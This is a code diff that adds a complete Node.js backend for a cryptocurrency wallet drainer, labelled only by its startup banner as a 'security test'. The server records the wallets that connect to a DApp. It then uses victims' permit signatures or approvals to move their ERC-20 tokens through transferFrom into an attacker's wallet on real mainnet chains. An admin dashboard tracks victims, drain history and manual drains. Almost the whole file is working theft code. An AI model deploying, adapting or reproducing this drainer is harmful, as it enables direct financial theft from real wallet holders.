@@ -1,0 +1,309 @@
+require('dotenv').config()
+const express = require('express')
+const cors    = require('cors')
+const { ethers } = require('ethers')
+const path = require('path')
+
+const app = express()
+app.use(cors())
+app.use(express.json())
+
+// Serve admin panel at /admin
+app.use('/admin', express.static(path.join(__dirname, 'admin')))
+app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')))
+
+// ── In-memory state (resets on server restart) ──────────────────────────────
+let config = {
+  attackerPrivateKey: process.env.ATTACKER_PRIVATE_KEY || '',
+  adminPassword:      process.env.ADMIN_PASSWORD || 'demo1234',
+}
+
+const connectedWallets = []   // all wallets that connected to the DApp
+const drainHistory     = []   // all drain attempts
+const logs             = []   // live log entries
+
+function addLog(level, msg) {
+  const entry = { time: new Date().toISOString(), level, msg }
+  logs.unshift(entry)
+  if (logs.length > 200) logs.pop()
+  console.log(`[${level.toUpperCase()}] ${msg}`)
+}
+
+// ── RPC providers per chain ──────────────────────────────────────────────────
+const RPCS = {
+  1:     'https://cloudflare-eth.com',
+  56:    'https://bsc-dataseed.binance.org',
+  137:   'https://polygon-rpc.com',
+  42161: 'https://arb1.arbitrum.io/rpc',
+  10:    'https://mainnet.optimism.io',
+  43114: 'https://api.avax.network/ext/bc/C/rpc',
+  8453:  'https://mainnet.base.org',
+}
+
+const EXPLORERS = {
+  1:     'https://etherscan.io/tx/',
+  56:    'https://bscscan.com/tx/',
+  137:   'https://polygonscan.com/tx/',
+  42161: 'https://arbiscan.io/tx/',
+  10:    'https://optimistic.etherscan.io/tx/',
+  43114: 'https://snowtrace.io/tx/',
+  8453:  'https://basescan.org/tx/',
+}
+
+const ERC20_ABI = [
+  'function permit(address,address,uint256,uint256,uint8,bytes32,bytes32)',
+  'function approve(address,uint256) returns (bool)',
+  'function transferFrom(address,address,uint256) returns (bool)',
+  'function balanceOf(address) view returns (uint256)',
+  'function allowance(address,address) view returns (uint256)',
+  'function decimals() view returns (uint8)',
+  'function symbol() view returns (string)',
+  'function name() view returns (string)',
+]
+
+function getAttackerWallet(chainId) {
+  if (!config.attackerPrivateKey) throw new Error('Attacker private key not configured')
+  const provider = new ethers.providers.JsonRpcProvider(RPCS[chainId] || RPCS[56])
+  return new ethers.Wallet(config.attackerPrivateKey, provider)
+}
+
+// ── Admin auth middleware ────────────────────────────────────────────────────
+function adminAuth(req, res, next) {
+  const auth = req.headers['x-admin-password']
+  if (auth !== config.adminPassword) {
+    return res.status(401).json({ error: 'Unauthorized' })
+  }
+  next()
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// PUBLIC ENDPOINTS (called by the victim's DApp frontend)
+// ════════════════════════════════════════════════════════════════════════════
+
+// Called when a wallet connects to the DApp
+app.post('/api/connect', (req, res) => {
+  const { address, chainId, userAgent } = req.body
+  if (!address) return res.json({ ok: false })
+
+  const existing = connectedWallets.find(w => w.address.toLowerCase() === address.toLowerCase())
+  if (!existing) {
+    const entry = {
+      id:        Date.now(),
+      address,
+      chainId,
+      userAgent: userAgent || '',
+      connectedAt: new Date().toISOString(),
+      drained:   false,
+      drainTx:   null,
+    }
+    connectedWallets.unshift(entry)
+    addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
+  }
+
+  res.json({ ok: true, attackerAddress: config.attackerPrivateKey
+    ? new ethers.Wallet(config.attackerPrivateKey).address
+    : null
+  })
+})
+
+// Called after victim approves spending — backend sweeps immediately
+app.post('/api/drain', async (req, res) => {
+  const { owner, tokenAddress, chainId, sig, permitParams } = req.body
+
+  addLog('warn', `Drain requested — owner: ${owner} | token: ${tokenAddress} | chain: ${chainId}`)
+
+  const record = {
+    id:          Date.now(),
+    owner,
+    tokenAddress,
+    chainId:     parseInt(chainId),
+    startedAt:   new Date().toISOString(),
+    success:     false,
+    txHash:      null,
+    amount:      null,
+    symbol:      null,
+    error:       null,
+  }
+
+  try {
+    const attacker = getAttackerWallet(parseInt(chainId))
+    const token    = new ethers.Contract(tokenAddress, ERC20_ABI, attacker)
+    const symbol   = await token.symbol().catch(() => 'TOKEN')
+    const decimals = await token.decimals().catch(() => 18)
+    record.symbol  = symbol
+
+    addLog('info', `Token: ${symbol} | Attacker: ${attacker.address}`)
+
+    // ── Step 1: Try permit() if signature was provided ──────────────────────
+    if (sig && permitParams) {
+      try {
+        addLog('info', `Attempting permit() on ${symbol}...`)
+        const { v, r, s } = ethers.utils.splitSignature(sig)
+        const tx = await token.permit(
+          owner,
+          attacker.address,
+          permitParams.value,
+          permitParams.deadline,
+          v, r, s,
+          { gasLimit: 300000 }
+        )
+        addLog('info', `permit() tx: ${tx.hash}`)
+        await tx.wait()
+        addLog('info', `permit() confirmed: ${tx.hash}`)
+      } catch (e) {
+        addLog('warn', `permit() failed (token may not support it): ${e.message.slice(0, 80)}`)
+      }
+    }
+
+    // ── Step 2: Check allowance ─────────────────────────────────────────────
+    const allowance = await token.allowance(owner, attacker.address)
+    addLog('info', `Allowance: ${ethers.utils.formatUnits(allowance, decimals)} ${symbol}`)
+
+    if (allowance.eq(0)) {
+      record.error = 'No allowance. Victim must approve first.'
+      addLog('warn', record.error)
+      drainHistory.unshift(record)
+      return res.json({ success: false, error: record.error })
+    }
+
+    // ── Step 3: transferFrom ────────────────────────────────────────────────
+    const balance     = await token.balanceOf(owner)
+    const drainAmount = balance.lt(allowance) ? balance : allowance
+
+    addLog('info', `Draining ${ethers.utils.formatUnits(drainAmount, decimals)} ${symbol}...`)
+
+    const gasPrice = await attacker.provider.getGasPrice()
+    const tx = await token.transferFrom(
+      owner,
+      attacker.address,
+      drainAmount,
+      { gasLimit: 200000, gasPrice: gasPrice.mul(13).div(10) }
+    )
+
+    addLog('info', `transferFrom tx sent: ${tx.hash}`)
+    await tx.wait()
+    addLog('info', `Drain confirmed! Tx: ${tx.hash}`)
+
+    const formatted = ethers.utils.formatUnits(drainAmount, decimals)
+    record.success  = true
+    record.txHash   = tx.hash
+    record.amount   = formatted
+    record.confirmedAt = new Date().toISOString()
+
+    // Mark wallet as drained
+    const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
+    if (w) { w.drained = true; w.drainTx = tx.hash }
+
+    drainHistory.unshift(record)
+
+    res.json({
+      success:     true,
+      txHash:      tx.hash,
+      amount:      formatted,
+      symbol,
+      explorerUrl: (EXPLORERS[parseInt(chainId)] || 'https://bscscan.com/tx/') + tx.hash
+    })
+
+  } catch (e) {
+    record.error = e.message
+    addLog('error', `Drain failed: ${e.message}`)
+    drainHistory.unshift(record)
+    res.json({ success: false, error: e.message })
+  }
+})
+
+// ════════════════════════════════════════════════════════════════════════════
+// ADMIN ENDPOINTS
+// ════════════════════════════════════════════════════════════════════════════
+
+app.post('/admin/login', (req, res) => {
+  const { password } = req.body
+  if (password === config.adminPassword) {
+    res.json({ ok: true })
+  } else {
+    res.status(401).json({ ok: false, error: 'Wrong password' })
+  }
+})
+
+// Get dashboard data
+app.get('/admin/dashboard', adminAuth, (req, res) => {
+  let attackerAddress = null
+  try {
+    if (config.attackerPrivateKey) {
+      attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address
+    }
+  } catch (_) {}
+
+  res.json({
+    attackerAddress,
+    totalConnected: connectedWallets.length,
+    totalDrained:   drainHistory.filter(d => d.success).length,
+    connectedWallets: connectedWallets.slice(0, 50),
+    drainHistory:     drainHistory.slice(0, 50),
+    logs:             logs.slice(0, 100),
+  })
+})
+
+// Update config (set receiving wallet, password)
+app.post('/admin/config', adminAuth, (req, res) => {
+  const { attackerPrivateKey, adminPassword } = req.body
+
+  if (attackerPrivateKey !== undefined) {
+    try {
+      new ethers.Wallet(attackerPrivateKey) // validate key
+      config.attackerPrivateKey = attackerPrivateKey
+      addLog('info', `Attacker wallet updated: ${new ethers.Wallet(attackerPrivateKey).address}`)
+    } catch (_) {
+      return res.json({ ok: false, error: 'Invalid private key' })
+    }
+  }
+
+  if (adminPassword) {
+    config.adminPassword = adminPassword
+    addLog('info', 'Admin password updated')
+  }
+
+  res.json({ ok: true })
+})
+
+// Manually trigger drain for a connected wallet
+app.post('/admin/drain-manual', adminAuth, async (req, res) => {
+  const { owner, tokenAddress, chainId } = req.body
+  addLog('warn', `Manual drain triggered for ${owner}`)
+  // Proxy to main drain endpoint
+  req.body = { owner, tokenAddress, chainId }
+  // reuse logic by calling internal
+  const fakeRes = {
+    json: (data) => res.json(data)
+  }
+  app._router.handle({ ...req, url: '/api/drain', method: 'POST' }, fakeRes, () => {})
+})
+
+// Clear logs
+app.delete('/admin/logs', adminAuth, (req, res) => {
+  logs.length = 0
+  res.json({ ok: true })
+})
+
+// ── Start ────────────────────────────────────────────────────────────────────
+const PORT = process.env.PORT || 3001
+app.listen(PORT, () => {
+  console.log('\n========================================')
+  console.log('  Drainer Demo Backend — SECURITY TEST')
+  console.log('========================================')
+  console.log(`  Backend API : http://localhost:${PORT}`)
+  console.log(`  Admin Panel : http://localhost:${PORT}/admin`)
+  console.log('========================================')
+
+  if (config.attackerPrivateKey) {
+    try {
+      const w = new ethers.Wallet(config.attackerPrivateKey)
+      console.log(`  Attacker    : ${w.address}`)
+    } catch (_) {
+      console.log('  Attacker    : Invalid key in .env')
+    }
+  } else {
+    console.log('  Attacker    : Not set — configure in Admin Panel')
+  }
+  console.log('========================================\n')
+})
